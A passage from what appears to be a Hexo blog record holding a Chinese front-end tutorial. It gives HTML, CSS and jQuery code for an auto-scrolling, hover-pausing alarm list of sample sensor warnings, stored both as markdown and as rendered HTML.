href=\"./css/warning.css\" />\n\t</head>\n\t<body>\n\t\t<div class=\"wrnList\" onmouseover=\"mouseEnter()\" onmouseout=\"mouseLeave()\" onclick=\"clickList()\">\n\t\t<div id=\"wrnList\"></div>\n\t</div>\n\t\t<script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>\n\t\t<script type=\"text/javascript\" src=\"./index.js\"></script>\n\t</body>\n</html>\n\n```\n\n* `warning.css`\n\n```css\nhtml,\nbody {\n\twidth: 100%;\n\theight: 100%;\n\tmargin: 0;\n\tpadding: 0;\n\tbackground-color: rgba(13, 20, 46, 1);\n}\n\n.wrnList {\n\twidth: 416px;\n\theight: 290px;\n\tposition: absolute;\n\tz-index: 999;\n\ttop: 82px;\n\tright: 14px;\n\toverflow: hidden;\n}\n\n#wrnList {\n\tpointer-events: none;\n}\n\n.wrnItem {\n\tmargin: 9px auto;\n\theight: 46px;\n\twidth: 302px;\n\tbackground-repeat: no-repeat;\n\tdisplay: flex;\n\talign-items: center;\n\tfont-size: 13px;\n\tcolor: #FFFFFF;\n}\n\n.child_1,.child_5,.child_6  {\n\tpadding: 0 40px;\n\twidth: calc(302px - 80px);\n\theight: 46px;\n\topacity: 0.3;\n\tbackground-image: url('./../img/wrn/small.png');\n\tbackground-size: 302px auto;\n}\n\n.child_2,.child_4 {\n\tpadding: 0 40px;\n\twidth: calc(302px - 80px);\n\theight: 46px;\n\topacity: 0.6;\n\tbackground-image: url('./../img/wrn/small.png');\n\tbackground-size: 302px auto;\n}\n\n.child_3 {\n\tposition: relative;\n\tpadding: 0 50px;\n\twidth: calc(416px - 100px);\n\theight: 58px;\n\topacity: 1;\n\tbackground-size: 100% auto;\n\tbackground-image: url('./../img/wrn/big.png');\n}\n\n.anim {\n\ttransition: all 0.4s;\n}\n\n.wrnItemTime {\n\twhite-space: nowrap;\n\tpadding-left: 24px;\n\tbackground-image: url('./../img/wrn/wrning.png');\n\tbackground-repeat: no-repeat;\n\tbackground-position: -6px -5px;\n\toverflow: hidden;\n\ttext-overflow: ellipsis;\n}\n```\n\n* `index.js`\n\n```js\nvar wrnList = [\n\t{ \"id\": 1, \"deviceType\": \"3\", \"content\": \"pressure过高\", \"createTime\": \"2020-10-20 13:34:05\", \"areaName\": \"某某区1\"},\n\t{ \"id\": 2, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区2\"},\n\t{ \"id\": 3, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区3\"},\n\t{ \"id\": 4, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区4\"},\n\t{ \"id\": 5, \"deviceType\": \"3\", \"content\": \"pressure过高\", \"createTime\": \"2020-10-20 13:04:05\", \"areaName\": \"某某区5\"},\n\t{ \"id\": 6, \"deviceType\": \"3\", \"content\": \"pressure过低\", \"createTime\": \"2020-10-20 12:34:05\", \"areaName\": \"某某区6\"}];\nvar timer = 0;\nmouseLeave();\n\n// 翻滚\nfunction autoScroll() {\n\tvar dom = $(\"#wrnList\");\n\tdom.css('margin-top', '-56px');\n\tdom.addClass('anim');\n\t// 第三行变第二行\n\tvar child3 = $(\".child_3\");\n\t// child3.removeClass('child_3');\n\t// child3.addClass('child_2');\n\tchild3.css('padding', '0 40px');\n\tchild3.css('opacity', '0.6');\n\tchild3.css('height', '46px');\n\tchild3.css('width', 'calc(302px - 80px)');\n\tchild3.css('background-image', \"url('./img/wrn/small.png')\");\n\tchild3.css('background-size', '302px auto');\n\tchild3.addClass('anim');\n\t// 第四行变第三行\n\tvar child4 = $(\".child_4\");\n\t// child4.removeClass('child_4');\n\t// child4.addClass('child_3');\n\tchild4.css('padding', '0 50px');\n\tchild4.css('opacity', '1');\n\tchild4.css('height', '58px');\n\tchild4.css('width', 'calc(416px - 100px)');\n\tchild4.css('background-image', \"url('./img/wrn/big.png')\");\n\tchild4.css('background-size', '416px auto');\n\tchild4.addClass('anim');\n\t// 第五行变第四行\n\tvar child5 = $(\".child_5\");\n\tchild5.css('opacity', '0.6');\n\tchild5.addClass('anim');\n\t// 第二行变第一行\n\tvar child2 = $(\".child_2\");\n\tchild2.css('opacity', '0.3');\n\tchild2.addClass('anim');\n\tvar that = this;\n\tsetTimeout(function () {\n\t\tthat.wrnList.push(that.wrnList[0]);\n\t\tthat.wrnList.shift();\n\t\tthat.insertWrn();\n\t\tdom.css('margin-top', '0px');\n\t\tdom.removeClass('anim');\n\t\tchild3.removeClass('anim');\n\t\tchild4.removeClass('anim');\n\t\tchild5.removeClass('anim');\n\t\tchild2.removeClass('anim');\n\t}, 400);\n}\n\n// 插数据方法\nfunction insertWrn() {\n\tvar hl = '';\n\tvar wrnType = '';\n\tfor (var i in wrnList) {\n\t\tif (i > 6) {\n\t\t\tbreak;\n\t\t}\n\t\tif (wrnList[i].deviceType == 4 || wrnList[i].deviceType == 5) {\n\t\t\twrnType = '用水报警';\n\t\t} else if (wrnList[i].deviceType == 2 || wrnList[i].deviceType == 3 || wrnList[i].deviceType == 7) {\n\t\t\twrnType = '管网报警';\n\t\t} else if (wrnList[i].deviceType == 6) {\n\t\t\twrnType = '用电报警';\n\t\t} else if (wrnList[i].deviceType == 1) {\n\t\t\twrnType = '空气报警';\n\t\t} else {\n\t\t\twrnType = '未知报警';\n\t\t}\n\t\thl += `<div class=\"wrnItem child_${parseInt(i) + 1}\"><div class=\"wrnItemTime\">${wrnList[i].areaName} ${wrnList[i].content} ${wrnType} ${wrnList[i].createTime}</div></div>`;\n\t}\n\t$(\"#wrnList\").html(hl);\n}\n\n// 告警列表点击事件\nfunction clickList(event) {\n\tvar itemId = wrnList[2].id;\n\tvar e = event || window.event;\n\tvar winWidth = window.innerWidth;\n\t// console.log(\"winWidth\", winWidth);\n\tlet x = e.clientX;\n\tlet y = e.clientY;\n\t// console.log(\"x\", x);\n\t// console.log(\"y\", y);\n\tlet right_margin = winWidth - x;\n\tlet top_margin = y;\n\t// console.log(\"right_margin\",right_margin);\n\t// console.log(\"top_margin\",top_margin);\n\tif (top_margin <= 285 && top_margin >= 256) {\n\t\tif (right_margin >= 153 && right_margin <= 223) {\n\t\t\t// console.log(\"发起工单\");\n\t\t\t// addWorkOrder(itemId);\n\t\t\talert(\"发起工单\" + itemId);\n\t\t} else if (right_margin > 223 && right_margin <= 394) {\n\t\t\t// console.log(\"忽略\");\n\t\t\t// ignoreWarning(itemId);\n\t\t\talert(\"误报\" + itemId);\n\t\t}\n\t}\n\t// console.log(\"i\", i);\n\t// console.log(\"itemId\", itemId);\n\n}\n\n// 鼠标移入\nfunction mouseEnter() {\n\t// console.log(\"mouseEnter\");\n\tif (timer != 0) {\n\t\tclearInterval(timer);\n\t}\n\tvar child = $(\".child_3\");\n\tchild.css('padding-bottom', '34px');\n\tchild.css('background-image', \"url('./img/wrn/big_on.png')\");\n}\n\n// 鼠标离开\nfunction mouseLeave() {\n\tinsertWrn();\n\tif (wrnList.length > 3) {\n\t\ttimer = setInterval(autoScroll, 1800);\n\t}\n}\n```\n\n* 原理自己探索吧，项目需求有些特别，所以有的地方比较定制化，自己用的话可能要做不少修改。","source":"_posts/post252.md","raw":"---\ntitle: h5实现一种自动滚动的告警列表\ndate: 2020-11-12 14:25:44\ntags: 前端\n\n---\n\n\n\n* [点击这里看效果](https://blog.ctftools.com/static_web/wrnList/index.html)，鼠标悬浮到告警列表会停止。\n\n<!--more-->\n\n* 点击下载[wrnList.zip](https://blog.ctftools.com/static_web/wrnList/wrnList.zip) 。\n\n* `index.html`\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<title>告警</title>\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"./css/warning.css\" />\n\t</head>\n\t<body>\n\t\t<div class=\"wrnList\" onmouseover=\"mouseEnter()\" onmouseout=\"mouseLeave()\" onclick=\"clickList()\">\n\t\t<div id=\"wrnList\"></div>\n\t</div>\n\t\t<script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>\n\t\t<script type=\"text/javascript\" src=\"./index.js\"></script>\n\t</body>\n</html>\n\n```\n\n* `warning.css`\n\n```css\nhtml,\nbody {\n\twidth: 100%;\n\theight: 100%;\n\tmargin: 0;\n\tpadding: 0;\n\tbackground-color: rgba(13, 20, 46, 1);\n}\n\n.wrnList {\n\twidth: 416px;\n\theight: 290px;\n\tposition: absolute;\n\tz-index: 999;\n\ttop: 82px;\n\tright: 14px;\n\toverflow: hidden;\n}\n\n#wrnList {\n\tpointer-events: none;\n}\n\n.wrnItem {\n\tmargin: 9px auto;\n\theight: 46px;\n\twidth: 302px;\n\tbackground-repeat: no-repeat;\n\tdisplay: flex;\n\talign-items: center;\n\tfont-size: 13px;\n\tcolor: #FFFFFF;\n}\n\n.child_1,.child_5,.child_6  {\n\tpadding: 0 40px;\n\twidth: calc(302px - 80px);\n\theight: 46px;\n\topacity: 0.3;\n\tbackground-image: url('./../img/wrn/small.png');\n\tbackground-size: 302px auto;\n}\n\n.child_2,.child_4 {\n\tpadding: 0 40px;\n\twidth: calc(302px - 80px);\n\theight: 46px;\n\topacity: 0.6;\n\tbackground-image: url('./../img/wrn/small.png');\n\tbackground-size: 302px auto;\n}\n\n.child_3 {\n\tposition: relative;\n\tpadding: 0 50px;\n\twidth: calc(416px - 100px);\n\theight: 58px;\n\topacity: 1;\n\tbackground-size: 100% auto;\n\tbackground-image: url('./../img/wrn/big.png');\n}\n\n.anim {\n\ttransition: all 0.4s;\n}\n\n.wrnItemTime {\n\twhite-space: nowrap;\n\tpadding-left: 24px;\n\tbackground-image: url('./../img/wrn/wrning.png');\n\tbackground-repeat: no-repeat;\n\tbackground-position: -6px -5px;\n\toverflow: hidden;\n\ttext-overflow: ellipsis;\n}\n```\n\n* `index.js`\n\n```js\nvar wrnList = [\n\t{ \"id\": 1, \"deviceType\": \"3\", \"content\": \"pressure过高\", \"createTime\": \"2020-10-20 13:34:05\", \"areaName\": \"某某区1\"},\n\t{ \"id\": 2, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区2\"},\n\t{ \"id\": 3, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区3\"},\n\t{ \"id\": 4, \"deviceType\": \"4\", \"content\": \"tds过低\", \"createTime\": \"2020-10-20 13:04:44\", \"areaName\": \"某某区4\"},\n\t{ \"id\": 5, \"deviceType\": \"3\", \"content\": \"pressure过高\", \"createTime\": \"2020-10-20 13:04:05\", \"areaName\": \"某某区5\"},\n\t{ \"id\": 6, \"deviceType\": \"3\", \"content\": \"pressure过低\", \"createTime\": \"2020-10-20 12:34:05\", \"areaName\": \"某某区6\"}];\nvar timer = 0;\nmouseLeave();\n\n// 翻滚\nfunction autoScroll() {\n\tvar dom = $(\"#wrnList\");\n\tdom.css('margin-top', '-56px');\n\tdom.addClass('anim');\n\t// 第三行变第二行\n\tvar child3 = $(\".child_3\");\n\t// child3.removeClass('child_3');\n\t// child3.addClass('child_2');\n\tchild3.css('padding', '0 40px');\n\tchild3.css('opacity', '0.6');\n\tchild3.css('height', '46px');\n\tchild3.css('width', 'calc(302px - 80px)');\n\tchild3.css('background-image', \"url('./img/wrn/small.png')\");\n\tchild3.css('background-size', '302px auto');\n\tchild3.addClass('anim');\n\t// 第四行变第三行\n\tvar child4 = $(\".child_4\");\n\t// child4.removeClass('child_4');\n\t// child4.addClass('child_3');\n\tchild4.css('padding', '0 50px');\n\tchild4.css('opacity', '1');\n\tchild4.css('height', '58px');\n\tchild4.css('width', 'calc(416px - 100px)');\n\tchild4.css('background-image', \"url('./img/wrn/big.png')\");\n\tchild4.css('background-size', '416px auto');\n\tchild4.addClass('anim');\n\t// 第五行变第四行\n\tvar child5 = $(\".child_5\");\n\tchild5.css('opacity', '0.6');\n\tchild5.addClass('anim');\n\t// 第二行变第一行\n\tvar child2 = $(\".child_2\");\n\tchild2.css('opacity', '0.3');\n\tchild2.addClass('anim');\n\tvar that = this;\n\tsetTimeout(function () {\n\t\tthat.wrnList.push(that.wrnList[0]);\n\t\tthat.wrnList.shift();\n\t\tthat.insertWrn();\n\t\tdom.css('margin-top', '0px');\n\t\tdom.removeClass('anim');\n\t\tchild3.removeClass('anim');\n\t\tchild4.removeClass('anim');\n\t\tchild5.removeClass('anim');\n\t\tchild2.removeClass('anim');\n\t}, 400);\n}\n\n// 插数据方法\nfunction insertWrn() {\n\tvar hl = '';\n\tvar wrnType = '';\n\tfor (var i in wrnList) {\n\t\tif (i > 6) {\n\t\t\tbreak;\n\t\t}\n\t\tif (wrnList[i].deviceType == 4 || wrnList[i].deviceType == 5) {\n\t\t\twrnType = '用水报警';\n\t\t} else if (wrnList[i].deviceType == 2 || wrnList[i].deviceType == 3 || wrnList[i].deviceType == 7) {\n\t\t\twrnType = '管网报警';\n\t\t} else if (wrnList[i].deviceType == 6) {\n\t\t\twrnType = '用电报警';\n\t\t} else if (wrnList[i].deviceType == 1) {\n\t\t\twrnType = '空气报警';\n\t\t} else {\n\t\t\twrnType = '未知报警';\n\t\t}\n\t\thl += `<div class=\"wrnItem child_${parseInt(i) + 1}\"><div class=\"wrnItemTime\">${wrnList[i].areaName} ${wrnList[i].content} ${wrnType} ${wrnList[i].createTime}</div></div>`;\n\t}\n\t$(\"#wrnList\").html(hl);\n}\n\n// 告警列表点击事件\nfunction clickList(event) {\n\tvar itemId = wrnList[2].id;\n\tvar e = event || window.event;\n\tvar winWidth = window.innerWidth;\n\t// console.log(\"winWidth\", winWidth);\n\tlet x = e.clientX;\n\tlet y = e.clientY;\n\t// console.log(\"x\", x);\n\t// console.log(\"y\", y);\n\tlet right_margin = winWidth - x;\n\tlet top_margin = y;\n\t// console.log(\"right_margin\",right_margin);\n\t// console.log(\"top_margin\",top_margin);\n\tif (top_margin <= 285 && top_margin >= 256) {\n\t\tif (right_margin >= 153 && right_margin <= 223) {\n\t\t\t// console.log(\"发起工单\");\n\t\t\t// addWorkOrder(itemId);\n\t\t\talert(\"发起工单\" + itemId);\n\t\t} else if (right_margin > 223 && right_margin <= 394) {\n\t\t\t// console.log(\"忽略\");\n\t\t\t// ignoreWarning(itemId);\n\t\t\talert(\"误报\" + itemId);\n\t\t}\n\t}\n\t// console.log(\"i\", i);\n\t// console.log(\"itemId\", itemId);\n\n}\n\n// 鼠标移入\nfunction mouseEnter() {\n\t// console.log(\"mouseEnter\");\n\tif (timer != 0) {\n\t\tclearInterval(timer);\n\t}\n\tvar child = $(\".child_3\");\n\tchild.css('padding-bottom', '34px');\n\tchild.css('background-image', \"url('./img/wrn/big_on.png')\");\n}\n\n// 鼠标离开\nfunction mouseLeave() {\n\tinsertWrn();\n\tif (wrnList.length > 3) {\n\t\ttimer = setInterval(autoScroll, 1800);\n\t}\n}\n```\n\n* 原理自己探索吧，项目需求有些特别，所以有的地方比较定制化，自己用的话可能要做不少修改。","slug":"post252","published":1,"updated":"2020-12-07T02:08:07.264Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5re30035q0szrwko06fi","content":"<ul>\n<li><a href=\"https://blog.ctftools.com/static_web/wrnList/index.html\">点击这里看效果</a>，鼠标悬浮到告警列表会停止。</li>\n</ul>\n<a id=\"more\"></a>\n<ul>\n<li><p>点击下载<a href=\"https://blog.ctftools.com/static_web/wrnList/wrnList.zip\">wrnList.zip</a> 。</p>\n</li>\n<li><p><code>index.html</code></p>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span> /&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>告警<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./css/warning.css\"</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"wrnList\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">\"mouseEnter()\"</span> <span class=\"attr\">onmouseout</span>=<span class=\"string\">\"mouseLeave()\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"clickList()\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"wrnList\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>warning.css</code></li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">rgba</span>(13, 20, 46, 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnList</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">416px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">290px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">\t<span class=\"attribute\">z-index</span>: <span class=\"number\">999</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">top</span>: <span class=\"number\">82px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">right</span>: <span class=\"number\">14px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#wrnList</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">pointer-events</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnItem</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">9px</span> auto;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">302px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-repeat</span>: no-repeat;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">\t<span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#FFFFFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_1</span>,<span class=\"selector-class\">.child_5</span>,<span class=\"selector-class\">.child_6</span>  &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">40px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(302px - 80px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">0.3</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/small.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">302px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_2</span>,<span class=\"selector-class\">.child_4</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">40px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(302px - 80px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">0.6</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/small.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">302px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_3</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">50px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(416px - 100px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">58px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">100%</span> auto;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/big.png'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.anim</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: all <span class=\"number\">0.4s</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnItemTime</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">\t<span class=\"attribute\">padding-left</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/wrning.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-repeat</span>: no-repeat;</span><br><span class=\"line\">\t<span class=\"attribute\">background-position</span>: -<span class=\"number\">6px</span> -<span class=\"number\">5px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">\t<span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>index.js</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span 